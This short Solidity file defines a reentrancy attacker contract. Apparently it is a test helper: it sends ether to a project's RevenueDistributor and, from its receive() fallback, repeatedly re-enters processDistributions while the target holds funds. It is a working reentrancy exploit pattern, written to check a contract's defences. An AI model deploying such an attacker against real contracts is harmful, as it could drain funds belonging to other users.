// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../RevenueDistributor.sol";

contract ReentrancyAttacker {
    RevenueDistributor public revenueDistributor;
    uint256 public projectId;

    constructor(address payable _revenueDistributor) {
        revenueDistributor = RevenueDistributor(_revenueDistributor);
    }

    function attack(uint256 _projectId) external payable {
        projectId = _projectId;
        revenueDistributor.receiveRevenue{value: msg.value}(projectId);
    }

    receive() external payable {
        if (address(revenueDistributor).balance >= 0.1 ether) {
            revenueDistributor.processDistributions(projectId);
        }
    }
} 